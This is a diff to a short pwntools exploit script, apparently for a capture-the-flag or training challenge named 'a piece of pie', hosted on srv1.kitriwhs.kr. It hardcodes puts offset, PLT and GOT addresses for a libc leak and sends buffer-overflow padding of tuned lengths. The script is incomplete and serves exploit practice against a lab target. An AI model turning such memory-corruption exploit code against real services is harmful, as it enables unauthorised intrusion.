@@ -1,19 +1,23 @@
 from pwn import *
 
-port =  21785
+port =  20465
 rem = remote("srv1.kitriwhs.kr", port)
 
-elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
-base_to_gadget = elf.symbols["gadget"]
+puts_offset = 0x80e50
+puts_plt = 0x10b0
+puts_got = 0x3fa0
+
+# elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
+# base_to_gadget = elf.symbols["gadget"]
 
 # libc = ELF('./WHS/a piece of pie/problem/libc.so.6')
 
-payload = b"A" * 0xb0
+payload = b"A" * 0x1
 rem.sendlineafter(b"name: ", payload)
 print(rem.recvline())
 
 
-payload = b"A" * 0x100
+payload = b"A" * 0xa7
 rem.sendlineafter(b"1: ", payload)
 print(rem.recvline())
 
